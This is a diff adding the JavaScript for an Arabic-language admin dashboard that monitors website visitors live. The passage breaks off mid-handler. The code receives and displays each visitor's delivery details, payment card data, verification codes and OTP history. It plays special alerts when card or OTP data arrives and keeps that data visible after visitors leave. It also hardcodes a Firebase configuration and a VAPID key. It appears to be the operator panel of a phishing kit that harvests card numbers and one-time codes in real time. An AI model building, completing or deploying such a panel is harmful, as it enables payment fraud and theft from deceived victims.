@@ -1,0 +1,3596 @@
+// Admin Dashboard JavaScript - Mobile First RTL
+const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+  ? 'http://localhost:3000'
+  : window.location.origin;
+
+let socket = null;
+let adminToken = localStorage.getItem('admin_token');
+let isMuted = false;
+let audioContext = null;
+
+// Loading screen management
+function hideLoadingScreen() {
+  const loading = document.getElementById('loadingScreen');
+  if (loading) loading.style.display = 'none';
+}
+
+// ==========================================
+// WEB AUDIO API - Notification Sound Generator
+// ==========================================
+function initAudioContext() {
+  if (!audioContext) {
+    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+  }
+  return audioContext;
+}
+
+function playNotificationBeep(type = "default") {
+  if (isMuted) return;
+  
+  try {
+    const ctx = initAudioContext();
+    
+    const playTone = (freq, startTime, duration, volume = 0.3) => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(freq, startTime);
+      
+      gain.gain.setValueAtTime(0, startTime);
+      gain.gain.linearRampToValueAtTime(volume, startTime + 0.01);
+      gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration);
+      
+      osc.start(startTime);
+      osc.stop(startTime + duration);
+    };
+    
+    const now = ctx.currentTime;
+    
+    // Different sounds for different notification types
+    if (type === "payment" || type === "verification") {
+      // Urgent: 3 quick beeps
+      playTone(880, now, 0.12, 0.4);
+      playTone(880, now + 0.15, 0.12, 0.4);
+      playTone(1100, now + 0.30, 0.20, 0.5);
+    } else if (type === "delivery") {
+      // Medium: 2 beeps
+      playTone(660, now, 0.15, 0.3);
+      playTone(880, now + 0.20, 0.20, 0.4);
+    } else {
+      // Default: pleasant chime
+      playTone(880, now, 0.15, 0.3);
+      playTone(1047, now + 0.18, 0.12, 0.3);
+      playTone(1319, now + 0.32, 0.20, 0.4);
+    }
+    
+    console.log("Notification sound played for type:", type);
+  } catch (e) {
+    console.error("Audio error:", e);
+  }
+}
+
+// Firebase FCM
+let fcmToken = null;
+let messaging = null;
+let firebaseInitialized = false;
+
+// Convert VAPID key to Uint8Array for PushManager - SAFE version for mobile
+function urlBase64ToUint8Array(base64String) {
+  try {
+    if (!base64String || typeof base64String !== 'string') {
+      console.error('Invalid base64 string for VAPID key');
+      return new Uint8Array(0);
+    }
+    const padding = "=".repeat((4 - base64String.length % 4) % 4);
+    const base64 = (base64String + padding).replace(/\-/g, "+").replace(/_/g, "/");
+    
+    // Check if window.atob is available (not available in some mobile WebViews)
+    if (typeof window !== 'undefined' && typeof window.atob === 'function') {
+      const rawData = window.atob(base64);
+      const outputArray = new Uint8Array(rawData.length);
+      for (let i = 0; i < rawData.length; ++i) {
+        outputArray[i] = rawData.charCodeAt(i);
+      }
+      return outputArray;
+    } else {
+      console.warn('window.atob not available, using fallback');
+      // Fallback using TextDecoder
+      const binaryString = atob(base64);
+      const bytes = new Uint8Array(binaryString.length);
+      for (let i = 0; i < binaryString.length; i++) {
+        bytes[i] = binaryString.charCodeAt(i);
+      }
+      return bytes;
+    }
+  } catch (error) {
+    console.error('Error converting VAPID key:', error);
+    return new Uint8Array(0);
+  }
+}
+
+// CRITICAL: Local cache of all visitors for sync between historical and live data
+let allAdminVisitors = [];
+
+// ==========================================
+// FIREBASE CLOUD MESSAGING - Push Notifications
+// Initialize Firebase and request notification permission
+async function initFirebaseMessaging() {
+  try {
+    // Wait for Service Worker to be fully ready
+    console.log("Waiting for Service Worker to be ready...");
+    const swRegistration = await navigator.serviceWorker.ready;
+    console.log("Service Worker is ready:", swRegistration.scope);
+    
+    // Check if notifications are already granted
+    if (Notification.permission === "granted") {
+      await registerFCMToken(swRegistration);
+      return;
+    }
+
+    // If blocked, do not ask again
+    if (Notification.permission === "blocked") {
+      console.log("Notifications blocked by user");
+      return;
+    }
+
+    // Permission default or denied - try to request
+    const permission = await Notification.requestPermission();
+    if (permission === "granted") {
+      await registerFCMToken(swRegistration);
+    }
+  } catch (error) {
+    console.error("Firebase initialization error:", error);
+  }
+}
+
+// Register FCM token with backend
+async function registerFCMToken(swRegistration) {
+  try {
+    if (!messaging) {
+      console.log("Firebase Messaging not available");
+      return;
+    }
+
+    console.log("Getting FCM token with Service Worker...");
+    const token = await messaging.getToken({
+      applicationServerKey: urlBase64ToUint8Array("BC1WzxOMotqy7j1IV0w74SFfrxc5zeaODQ4XR87VT51ymhCluW9noLAD9-PxX4yWDMsDidJMkR6cojSIWdTBK1w"),
+      serviceWorkerRegistration: swRegistration
+    });
+
+    if (token) {
+      fcmToken = token;
+      console.log("FCM Token received:", token.substring(0, 30) + "...");
+
+      // Send token to backend
+      const response = await fetch(SERVER_URL + "/api/admin/fcm-token", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: token, enabled: true })
+      });
+
+      const result = await response.json();
+      if (result.success) {
+        // Play test notification sound and show test notification
+        playNotificationBeep("default");
+        showNotification("🔔 اختبار الإشعارات", "تم تفعيل الإشعارات بنجاح! ستصلك إشعارات فورية عند كل زائر جديد.", "success");
+        // Also send test push notification via Service Worker
+        if ("Notification" in window && Notification.permission === "granted") {
+          new Notification("🔔 اختبار الإشعارات", {
+            body: "تم تفعيل الإشعارات بنجاح!",
+            icon: "/admin/icon.png",
+            tag: "test-notification"
+          });
+        }
+        console.log("FCM Token registered successfully on backend!");
+        updateNotificationStatus(true);
+      } else {
+        console.error("Backend registration failed:", result.message);
+      }
+    }
+  } catch (error) {
+    console.error("FCM Token registration error:", error);
+  }
+}
+
+// Update notification status UI
+function updateNotificationStatus(enabled) {
+  const badge = document.getElementById('notificationBadge');
+  if (badge) {
+    badge.textContent = enabled ? '🔔' : '🔕';
+    badge.title = enabled ? 'الإشعارات مفعّلة' : 'الإشعارات معطّلة';
+  }
+}
+
+// Initialize Firebase SDK
+// Initialize Firebase SDK - SAFE for mobile browsers
+function setupFirebaseSDK() {
+  if (firebaseInitialized) return;
+  
+  // Check if firebase namespace exists (loaded via script tag)
+  if (typeof firebase === 'undefined') {
+    console.log('⚠️ Firebase SDK not loaded yet, will retry later');
+    return;
+  }
+  
+  // Check if messaging is available as a function
+  if (typeof firebase.messaging !== 'function') {
+    console.log('⚠️ Firebase messaging not available');
+    return;
+  }
+
+  console.log('🔍 Firebase SDK detected, initializing...');
+
+  try {
+    firebase.initializeApp({
+      apiKey: "AIzaSyA9sRFkHrqOlRkyMfzl4AyK618J12D_uk8",
+      authDomain: "adminqatar-d4192.firebaseapp.com",
+      projectId: "adminqatar-d4192",
+      storageBucket: "adminqatar-d4192.firebasestorage.app",
+      messagingSenderId: "927564639029",
+      appId: "1:927564639029:web:025a0c2e77ce6bba367a7c"
+    });
+
+    messaging = firebase.messaging();
+    firebaseInitialized = true;
+
+    // Handle foreground messages
+    messaging.onMessage((payload) => {
+      console.log('📱 Foreground message received:', payload);
+
+      // Show in-app notification - safe null checks
+      if (payload && payload.notification) {
+        playNotificationBeep(payload.data?.type || 'default');
+        showNotification(payload.notification.title, payload.notification.body, 'info');
+      }
+    });
+
+    console.log('✅ Firebase SDK initialized successfully');
+  } catch (err) {
+    console.error('❌ Firebase init error:', err.message);
+  }
+}
+
+// Manual enable notifications (called from UI button)
+async function enableNotifications() {
+  try {
+    const permission = await Notification.requestPermission();
+    if (permission === 'granted') {
+      await registerFCMToken();
+      showNotification('✅', 'تم تفعيل الإشعارات!', 'success');
+    } else {
+      showNotification('❌', 'لم يتم السماح بالإشعارات', 'error');
+    }
+  } catch (error) {
+    showNotification('❌', 'خطأ في تفعيل الإشعارات', 'error');
+  }
+}
+
+// ==========================================
+// SMART SOUND SYSTEM - Silent typing, alerts only on submissions
+// ==========================================
+
+// Track which events we've already notified about (prevent spam)
+const notifiedEvents = new Map();
+
+// Sound definitions using Web Audio API
+const sounds = {
+  // 🎉 NEW VISITOR (عميل جديد) - صوت احتفالي قصير
+  newVisitor: () => {
+    if (isMuted) return;
+    // نغمة احتفالية: دو上升 quick celebration
+    playCustomSound({
+      frequencies: [523.25, 659.25, 783.99],
+      duration: 0.12,
+      gap: 0.05,
+      volume: 0.3,
+      type: 'sine',
+      repeat: 1
+    });
+  },
+  
+  // 👋 RETURNING VISITOR (عميل يعود) - صوت ترحيبي مختلف
+  returningVisitor: () => {
+    if (isMuted) return;
+    // نغمة ترحيبية: gentle welcome
+    playCustomSound({
+      frequencies: [392, 493.88],
+      duration: 0.15,
+      gap: 0.08,
+      volume: 0.25,
+      type: 'sine',
+      repeat: 1
+    });
+  },
+  
+  // 📦 DELIVERY DATA (بيانات التوصيل) - صوت مزدوج لطيف
+  formDelivery: () => {
+    if (isMuted) return;
+    // نغمة نجاح مزدوجة: double success beep
+    playCustomSound({
+      frequencies: [523.25, 0, 659.25],
+      duration: 0.15,
+      gap: 0.12,
+      volume: 0.3,
+      type: 'triangle',
+      repeat: 1
+    });
+  },
+  
+  // 💳 PAYMENT CARD (بيانات البطاقة) - صوت طويل وقوي
+  formPayment: () => {
+    if (isMuted) return;
+    // نغمة مالية قوية وطويلة: strong financial alert
+    playCustomSound({
+      frequencies: [523.25, 0, 659.25, 0, 783.99, 0, 1046.50],
+      duration: 0.25,
+      gap: 0.08,
+      volume: 0.4,
+      type: 'square',
+      repeat: 1
+    });
+  },
+  
+  // 🔐 OTP CODE (رمز التحقق) - صوت قصير وقوي ومختلف
+  formVerification: () => {
+    if (isMuted) return;
+    // نغمة تنبيه سريعة وقوية: rapid urgent alert
+    playCustomSound({
+      frequencies: [880, 0, 1046.50, 0, 1174.66],
+      duration: 0.1,
+      gap: 0.05,
+      volume: 0.5,
+      type: 'sawtooth',
+      repeat: 1
+    });
+  }
+};
+
+// Play gentle notification when visitor changes page
+function playPageChangeSound() {
+  if (isMuted) return;
+  // Soft single chime - gentle notification
+  playCustomSound({
+    frequencies: [440, 554.37],
+    duration: 0.1,
+    gap: 0.1,
+    volume: 0.15,
+    type: 'sine',
+    repeat: 1
+  });
+}
+
+// Advanced custom sound generator using Web Audio API
+function playCustomSound(config) {
+  try {
+    const {
+      frequencies = [440],
+      duration = 0.15,
+      gap = 0.1,
+      volume = 0.3,
+      type = 'sine',
+      repeat = 1
+    } = config;
+    
+    // Create new AudioContext
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    
+    // Resume context if suspended (browser policy)
+    if (ctx.state === 'suspended') {
+      ctx.resume();
+    }
+    
+    // Master gain for overall volume control
+    const masterGain = ctx.createGain();
+    masterGain.connect(ctx.destination);
+    masterGain.gain.value = volume;
+    
+    const playSequence = () => {
+      frequencies.forEach((freq, i) => {
+        if (freq === 0) return; // Skip silence gaps
+        
+        const startTime = ctx.currentTime + (i * (duration + gap));
+        
+        // Create oscillator
+        const oscillator = ctx.createOscillator();
+        const gainNode = ctx.createGain();
+        
+        // Connect: oscillator -> gain -> master
+        oscillator.connect(gainNode);
+        gainNode.connect(masterGain);
+        
+        // Set frequency and wave type
+        oscillator.frequency.value = freq;
+        oscillator.type = type;
+        
+        // Volume envelope - punchy attack and smooth release
+        gainNode.gain.setValueAtTime(0, startTime);
+        gainNode.gain.linearRampToValueAtTime(0.9, startTime + 0.01); // Fast attack
+        gainNode.gain.exponentialRampToValueAtTime(0.5, startTime + duration * 0.3); // Decay
+        gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration); // Release
+        
+        // Start and stop
+        oscillator.start(startTime);
+        oscillator.stop(startTime + duration + 0.1);
+      });
+    };
+    
+    // Play sequence (with repeat if needed)
+    for (let r = 0; r < repeat; r++) {
+      const repeatDelay = r * (frequencies.length * (duration + gap) + 0.3);
+      setTimeout(playSequence, repeatDelay * 1000);
+    }
+    
+    // Cleanup context after all sounds done
+    const totalDuration = repeat * (frequencies.length * (duration + gap) + 0.3);
+    setTimeout(() => ctx.close(), totalDuration * 1000 + 500);
+    
+  } catch (e) { 
+    console.warn('Audio playback not supported:', e); 
+  }
+}
+
+// Legacy function for backward compatibility
+function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
+  playCustomSound({ frequencies, duration, gap, volume: 0.3, type: 'sine', repeat: 1 });
+}
+
+// Check if we should play sound (prevent duplicate notifications)
+function shouldPlaySound(sessionId, eventType) {
+  const key = `${sessionId}_${eventType}`;
+  const now = Date.now();
+  const lastPlayed = notifiedEvents.get(key);
+  
+  // Different timeouts for different event types
+  let timeout = 3000; // Default 3 seconds
+  
+  // Visitor sounds need longer timeout (5 seconds)
+  if (eventType === 'newVisitor' || eventType === 'returningVisitor') {
+    timeout = 5000;
+  }
+  
+  // Don't play if played in last X seconds (prevent spam)
+  if (lastPlayed && (now - lastPlayed) < timeout) {
+    return false;
+  }
+  
+  notifiedEvents.set(key, now);
+  
+  // Clean old entries (older than 1 minute)
+  for (const [k, v] of notifiedEvents) {
+    if (now - v > 60000) notifiedEvents.delete(k);
+  }
+  
+  return true;
+}
+
+// ==========================================
+// VISITOR CACHE MANAGEMENT
+// ==========================================
+
+// Render ALL visitors from cache to grid (initial load)
+function renderAllVisitorsToGrid() {
+  const grid = document.getElementById('visitorsGrid');
+  if (!grid) {
+    console.log('❌ Grid not found!');
+    return;
+  }
+  
+  // COMPLETELY CLEAR THE GRID
+  grid.innerHTML = '';
+  grid.offsetHeight; // Trigger reflow
+  
+  if (allAdminVisitors.length === 0) {
+    grid.innerHTML = '<div class="empty-state"><span>👥</span><h3>لا يوجد زوار</h3><p>الزوار سيظهرون هنا</p></div>';
+    console.log('✅ No visitors to display');
+    return;
+  }
+  
+  // BUILD NEW CARDS FROM SCRATCH
+  const fragment = document.createDocumentFragment();
+  
+  allAdminVisitors.forEach((visitor, index) => {
+    try {
+      const cardHTML = createVisitorCard(visitor);
+      const tempDiv = document.createElement('div');
+      tempDiv.innerHTML = cardHTML;
+      const cardElement = tempDiv.firstElementChild;
+      
+      if (cardElement) {
+        // Add animation
+        cardElement.style.opacity = '0';
+        cardElement.style.transform = 'translateY(20px)';
+        fragment.appendChild(cardElement);
+        
+        // Trigger animation after append
+        requestAnimationFrame(() => {
+          setTimeout(() => {
+            cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+            cardElement.style.opacity = '1';
+            cardElement.style.transform = 'translateY(0)';
+          }, index * 50);
+        });
+      }
+    } catch (e) {
+      console.error('❌ Error creating card:', e);
+    }
+  });
+  
+  // Append all cards at once
+  grid.appendChild(fragment);
+  
+  // Update counts
+  updateOnlineCounts();
+  
+  console.log(`✅ Rendered ${allAdminVisitors.length} visitor cards`);
+}
+
+// Update a single visitor card in grid (live update)
+function updateVisitorCardInGrid(sessionId, visitorData) {
+  const grid = document.getElementById('visitorsGrid');
+  if (!grid) return;
+  
+  // Find existing card
+  const existingCard = grid.querySelector(`[data-session="${sessionId}"]`);
+  
+  if (existingCard) {
+    // UPDATE existing card - rebuild and replace
+    const newCardHTML = createVisitorCard(visitorData);
+    const tempDiv = document.createElement('div');
+    tempDiv.innerHTML = newCardHTML;
+    const newCard = tempDiv.firstElementChild;
+    
+    if (newCard) {
+      // Add highlight effect
+      newCard.style.boxShadow = '0 0 20px rgba(99, 102, 241, 0.5)';
+      newCard.style.borderColor = 'var(--primary)';
+      
+      // Replace old card with new
+      existingCard.replaceWith(newCard);
+      
+      // Remove highlight after animation
+      setTimeout(() => {
+        newCard.style.boxShadow = '';
+        newCard.style.borderColor = '';
+      }, 2000);
+      
+      console.log(`🔄 Updated card for ${sessionId}`);
+    }
+  } else {
+    // Card doesn't exist - add new one
+    addVisitorCardToGrid(visitorData, true);
+  }
+}
+
+// Add a new visitor card to grid
+function addVisitorCardToGrid(visitorData, atTop = true) {
+  const grid = document.getElementById('visitorsGrid');
+  if (!grid) return;
+  
+  // Remove empty state if exists
+  const emptyState = grid.querySelector('.empty-state');
+  if (emptyState) {
+    emptyState.remove();
+  }
+  
+  try {
+    const cardHTML = createVisitorCard(visitorData);
+    const tempDiv = document.createElement('div');
+    tempDiv.innerHTML = cardHTML;
+    const cardElement = tempDiv.firstElementChild;
+    
+    if (cardElement) {
+      // Animate in
+      cardElement.style.opacity = '0';
+      cardElement.style.transform = 'translateY(-20px)';
+      
+      if (atTop && grid.firstChild) {
+        grid.insertBefore(cardElement, grid.firstChild);
+      } else {
+        grid.appendChild(cardElement);
+      }
+      
+      requestAnimationFrame(() => {
+        cardElement.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+        cardElement.style.opacity = '1';
+        cardElement.style.transform = 'translateY(0)';
+      });
+      
+      console.log(`🆕 Added new card for ${visitorData.session_id || visitorData.sessionId}`);
+    }
+  } catch (e) {
+    console.error('❌ Error adding card:', e);
+  }
+}
+
+// Update online/total counts based on cache
+function updateOnlineCounts() {
+  const onlineCount = allAdminVisitors.filter(v => v.is_online === true).length;
+  const countEl = document.getElementById('onlineCount');
+  const totalCountEl = document.getElementById('totalCount');
+  
+  if (countEl) countEl.textContent = onlineCount;
+  if (totalCountEl) totalCountEl.textContent = allAdminVisitors.length;
+}
+
+// Socket connection state
+let socketListenersRegistered = false;
+
+// Initialize Socket Connection (called AFTER successful login)
+function initAdminSocket(password) {
+  return new Promise((resolve, reject) => {
+    // Disconnect existing socket if any
+    if (socket) {
+      socket.disconnect();
+      socket = null;
+    }
+    
+    // Create socket with password as auth token
+    socket = io(SERVER_URL, {
+      auth: {
+        token: password // Send password directly for socket auth
+      },
+      query: { sessionId: 'admin_' + Date.now() },
+      transports: ['websocket', 'polling'],
+      reconnection: true,
+      reconnectionAttempts: 5,
+      reconnectionDelay: 1000
+    });
+
+    socket.on('connect', () => {
+      console.log('🔌 Admin socket connected, socket id:', socket.id);
+      updateConnectionStatus(true);
+      
+      // Register listeners only once
+      if (!socketListenersRegistered) {
+        setupSocketListeners();
+        socketListenersRegistered = true;
+      }
+      
+      resolve(socket);
+    });
+
+    socket.on('connect_error', (error) => {
+      console.error('❌ Socket connection error:', error.message);
+      updateConnectionStatus(false);
+      reject(error);
+    });
+
+    socket.on('disconnect', () => {
+      console.log('🔌 Admin socket disconnected');
+      updateConnectionStatus(false);
+    });
+    
+    socket.on('unauthorized', (data) => {
+      console.error('❌ Socket unauthorized:', data.message);
+      socket.disconnect();
+      reject(new Error(data.message));
+    });
+  });
+}
+
+// Reconnect socket with existing token
+function reconnectSocket() {
+  return new Promise((resolve, reject) => {
+    if (socket && socket.connected) {
+      resolve(socket);
+      return;
+    }
+    
+    initAdminSocket(adminToken).then(resolve).catch(reject);
+  });
+}
+
+// Separate function for all socket listeners
+function setupSocketListeners() {
+  if (!socket) {
+    console.log('❌ Socket not ready for listeners');
+    return;
+  }
+  console.log('📡 Setting up socket listeners...');
+
+  socket.on('admin:valid', (data) => {
+    console.log('🔐 Admin validation result:', data);
+    if (!data.valid) {
+      localStorage.removeItem('admin_token');
+      localStorage.removeItem('admin_login_time');
+      adminToken = null;
+      
+      // Show session expired message if applicable
+      if (data.reason === 'session_expired') {
+        showNotification('انتهت جلستك', 'انتهت صلاحية جلستك، يرجى تسجيل الدخول مجدداً', 'warning');
+      }
+    } else {
+      // Session is valid - save login time if provided
+      if (data.loginAt) {
+        localStorage.setItem('admin_login_time', data.loginAt);
+      }
+    }
+  });
+
+  socket.on('admin:loginSuccess', (data) => {
+    console.log('🔐 Admin login success:', data);
+    if (data.sessionToken) {
+      localStorage.setItem('admin_token', data.sessionToken);
+      localStorage.setItem('admin_login_time', new Date().toISOString());
+      adminToken = data.sessionToken;
+    }
+    // Request initial data after successful login
+    console.log('📡 Requesting initial data after login...');
+    socket.emit('visitors:request');
+    socket.emit('stats:request');
+  });
+
+  socket.on('admin:loginFailed', (data) => {
+    console.error('❌ Admin login failed:', data.message);
+  });
+
+  socket.on('admin:forceLogout', () => {
+    localStorage.removeItem('admin_token');
+    localStorage.removeItem('admin_login_time');
+    adminToken = null;
+    showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
+    setTimeout(() => showLoginPage(), 2000);
+  });
+
+  // CRITICAL: Load all historical visitors on initial connection
+  // This is the FIRST data load - populate the cache and render all visitors
+  socket.on('admin:initData', (data) => {
+    console.log('📊 DATA RECEIVED VIA SOCKET (admin:initData):', data);
+    console.log('📊 Visitors count:', data.visitors?.length || 0);
+    console.log('📊 First visitor has submissions:', !!data.visitors?.[0]?.delivery_submissions);
+    
+    const grid = document.getElementById('visitorsGrid');
+    if (!grid) {
+      console.log('❌ Grid not found!');
+      return;
+    }
+    
+    // Get visitors array
+    let visitors = data.visitors || [];
+    console.log('📊 Processing', visitors.length, 'visitors');
+    
+    // CRITICAL STEP 1: Populate the local cache
+    allAdminVisitors = visitors.map(v => ({...v}));
+    console.log(`📦 Cached ${allAdminVisitors.length} visitors in allAdminVisitors`);
+    
+    // CRITICAL STEP 2: Render all visitors immediately
+    renderAllVisitorsToGrid();
+    
+    // Update stats if provided
+    if (data.stats) {
+      updateStatsDisplay(data.stats);
+    }
+  });
+
+  // CRITICAL: Handle live visitor updates - UPDATE existing or ADD new
+  socket.on('visitor:updated', (data) => {
+    console.log('🔄 LIVE UPDATE (visitor:updated):', data);
+    
+    const sessionId = data.session_id || data.sessionId;
+    if (!sessionId) return;
+    
+    // Find visitor in cache
+    const existingIndex = allAdminVisitors.findIndex(v => 
+      v.session_id === sessionId || v.sessionId === sessionId
+    );
+    
+    if (existingIndex !== -1) {
+      // UPDATE existing visitor - merge new data with existing
+      console.log(`🔄 Updating existing visitor ${sessionId} at index ${existingIndex}`);
+      allAdminVisitors[existingIndex] = {...allAdminVisitors[existingIndex], ...data};
+      
+      // Re-render just this card (live update)
+      updateVisitorCardInGrid(sessionId, allAdminVisitors[existingIndex]);
+    } else {
+      // ADD new visitor to cache
+      console.log(`🆕 Adding new visitor ${sessionId} to cache`);
+      allAdminVisitors.unshift({...data});
+      
+      // Add new card to top of grid
+      addVisitorCardToGrid(data, true);
+    }
+    
+    // Update stats
+    updateOnlineCounts();
+  });
+
+  // Handle stats data
+  socket.on('stats:data', (data) => {
+    console.log('📊 DATA RECEIVED VIA SOCKET (stats:data):', data);
+    updateStatsDisplay(data);
+  });
+
+  // CRITICAL: Real-time updates from visitors
+  socket.on('visitor:new', (data) => {
+    const sessionId = data.session_id || data.sessionId;
+    
+    if (!sessionId) {
+      return;
+    }
+    
+    // Check if card already exists (returning visitor)
+    const existingCard = document.querySelector('[data-session="' + sessionId + '"]');
+    const wasInCache = visitorsCache.has(sessionId);
+    
+    // Check if visitor has important data (delivery, payment, or OTP)
+    const hasImportantData = (
+      data.delivery_data && Object.keys(data.delivery_data).length > 0 ||
+      data.payment_data && Object.keys(data.payment_data).length > 0 ||
+      data.verification_data && Object.keys(data.verification_data).length > 0 ||
+      data.otp_history && data.otp_history.length > 0
+    );
+    
+    // 🎵 PLAY DIFFERENT SOUND BASED ON VISITOR TYPE
+    if (!existingCard && !wasInCache) {
+      // NEW VISITOR - play celebration sound
+      if (shouldPlaySound(sessionId, 'newVisitor')) {
+        sounds.newVisitor();
+      }
+    } else {
+      // RETURNING VISITOR - play welcome sound
+      if (shouldPlaySound(sessionId, 'returningVisitor')) {
+        sounds.returningVisitor();
+      }
+    }
+    
+    // IMPORTANT: Only create card if visitor has important data
+    if (hasImportantData) {
+      // Has important data - create the card
+      if (existingCard) {
+        // IMPORTANT: Reset card visual state to online when visitor reconnects/init
+        // This overrides any previous "disconnected" or "offline" state
+        existingCard.style.opacity = '1';
+        existingCard.setAttribute('data-online', 'true');
+        existingCard.setAttribute('data-status', 'online');
+        
+        // Update status indicator
+        const statusEl = existingCard.querySelector('.card-status');
+        if (statusEl) {
+          statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+        }
+        
+        // Card exists - smart update and move to top
+        updateCardAndMoveToTop(sessionId, data);
+      } else {
+        // New card with important data - add to DOM
+        const grid = document.getElementById('visitorsGrid');
+        if (grid) {
+          createVisitorCardElement(data, grid);
+          
+          // Remove empty state if exists
+          const emptyState = grid.querySelector('.empty-state');
+          if (emptyState) emptyState.remove();
+        }
+      }
+    } else {
+      // No important data - just show notification with country
+      const countryName = data.country || 'غير معروف';
+      const countryFlag = getCountryFlag(data.country_code || '');
+      showNotification(
+        '🌍 زائر جديد',
+        `${countryFlag} ${countryName}`,
+        'info'
+      );
+    }
+    
+    // Also add to cache
+    visitorsCache.set(sessionId, data);
+    if (!allAdminVisitors.find(v => v.session_id === sessionId)) {
+      allAdminVisitors.unshift(data);
+    }
+    
+    updateStats();
+  });
+
+  socket.on('visitor:pageChange', (data) => {
+    // NO SOUND - page changes should be silent
+    const sessionId = data.sessionId || data.session_id;
+    
+    // CRITICAL: Forcefully reset card visual state to ACTIVE when user navigates
+    // This completely overrides any previous "disconnected", "idle", or "offline" state
+    const card = document.querySelector('[data-session="' + sessionId + '"]');
+    if (card) {
+      // Reset opacity to full visibility
+      card.style.opacity = '1';
+      card.setAttribute('data-online', 'true');
+      card.setAttribute('data-status', 'online');
+      
+      // Reset to vibrant active color
+      const headerBg = card.querySelector('.card-header-new') || card.querySelector('.card-header');
+      if (headerBg) {
+        headerBg.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+      }
+      
+      // Clear any offline/idle text indicators
+      const statusEl = card.querySelector('.card-status') || card.querySelector('.online-status');
+      if (statusEl) {
+        statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+        statusEl.classList.remove('offline', 'idle');
+        statusEl.classList.add('online');
+      }
+      
+      // Force restore dynamic page color coding
+      if (data.current_page || data.page) {
+        const page = data.current_page || data.page;
+        const pageInfo = getPageColor(page);
+        
+        // Update page badge with correct color
+        const pageBadge = card.querySelector('.page-badge');
+        if (pageBadge) {
+          pageBadge.textContent = pageInfo.text;
+          pageBadge.style.background = pageInfo.bg;
+        }
+        
+        // Update header with page-specific vibrant color
+        if (headerBg) {
+          headerBg.style.background = pageInfo.headerBg;
+        }
+      }
+    }
+    
+    // Update card and move to top (smart update, not full refresh)
+    updateCardAndMoveToTop(sessionId, data);
+  });
+
+  socket.on('visitor:offline', (data) => {
+    const sessionId = data.session_id || data.sessionId;
+    
+    // IMPORTANT: DO NOT remove card, just update visual status
+    // The card with all OTP data should remain visible
+    updateVisitorStatus(sessionId, false);
+    
+    // Move to top when going offline (recent activity)
+    moveCardToTop(sessionId);
+    
+    // Update stats
+    updateStats();
+  });
+
+  socket.on('visitor:online', (data) => {
+    console.log('🟢 DATA RECEIVED VIA SOCKET (visitor:online):', data);
+    const sessionId = data.sessionId || data.session_id;
+    
+    // CRITICAL: Forcefully reset card visual state to ACTIVE
+    // This completely overrides any "disconnected" or "offline" visual state
+    const card = document.querySelector('[data-session="' + sessionId + '"]');
+    if (card) {
+      // Reset opacity to full visibility
+      card.style.opacity = '1';
+      card.setAttribute('data-online', 'true');
+      card.setAttribute('data-status', 'online');
+      
+      // Reset to vibrant active color
+      const headerBg = card.querySelector('.card-header-new') || card.querySelector('.card-header');
+      if (headerBg) {
+        headerBg.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+      }
+      
+      // Clear any offline/idle text indicators
+      const statusEl = card.querySelector('.card-status') || card.querySelector('.online-status');
+      if (statusEl) {
+        statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+        statusEl.classList.remove('offline', 'idle');
+        statusEl.classList.add('online');
+      }
+    }
+    
+    updateVisitorStatus(sessionId, true);
+    // Move to top when coming online
+    moveCardToTop(sessionId);
+  });
+
+  // IMMEDIATE: Handle visitor disconnect - instant visual feedback
+  socket.on('visitor:disconnected', (data) => {
+    console.log('🔴 VISITOR DISCONNECTED:', data.sessionId);
+    const sessionId = data.sessionId;
+    
+    // Find and update the visitor card immediately
+    const card = document.querySelector('[data-session="' + sessionId + '"]');
+    if (card) {
+      // Reduce opacity to indicate disconnected
+      card.style.opacity = '0.5';
+      
+      // Update status indicator to "غادر الموقع 🔴"
+      const statusEl = card.querySelector('.card-status');
+      if (statusEl) {
+        statusEl.innerHTML = '<span class="dot offline"></span><span>غادر الموقع 🔴</span>';
+      }
+      
+      // Update data attribute
+      card.setAttribute('data-online', 'false');
+    }
+    
+    // Update stats
+    updateStats();
+  });
+
+  // CRITICAL: Handle all status changes (online, idle, offline)
+  socket.on('visitor:statusChange', (data) => {
+    console.log('🔄 DATA RECEIVED VIA SOCKET (visitor:statusChange):', data);
+    const sessionId = data.session_id || data.sessionId;
+    const status = data.visit_status || (data.is_online ? 'online' : 'offline');
+    
+    // Update the visitor in the cache
+    const existingIndex = allAdminVisitors.findIndex(v => 
+      v.session_id === sessionId || v.sessionId === sessionId
+    );
+    
+    if (existingIndex !== -1) {
+      allAdminVisitors[existingIndex] = {...allAdminVisitors[existingIndex], ...data};
+    }
+    
+    // Update the card visual status
+    updateVisitorStatusBadge(sessionId, status);
+    
+    // Update online counts
+    updateOnlineCounts();
+    
+    // Move card to top for recent activity
+    moveCardToTop(sessionId);
+  });
+
+  socket.on('form:deliverySubmitted', (data) => {
+    const sessionId = data.session_id || data.sessionId;
+    
+    // Play sound ONLY for actual submission - with spam protection
+    if (shouldPlaySound(sessionId, 'delivery')) {
+      sounds.formDelivery();
+    }
+    
+    // Update or create card, then move to top
+    processVisitorUpdate(sessionId, data);
+    updateStats();
+  });
+
+  socket.on('form:paymentSubmitted', (data) => {
+    const sessionId = data.session_id || data.sessionId;
+    
+    // Play sound ONLY for actual submission - with spam protection
+    if (shouldPlaySound(sessionId, 'payment')) {
+      sounds.formPayment();
+    }
+    
+    // Update or create card, then move to top
+    processVisitorUpdate(sessionId, data);
+    updateStats();
+  });
+
+  socket.on('form:verificationSubmitted', (data) => {
+    const sessionId = data.session_id || data.sessionId;
+    
+    // Play sound ONLY for actual submission - with spam protection
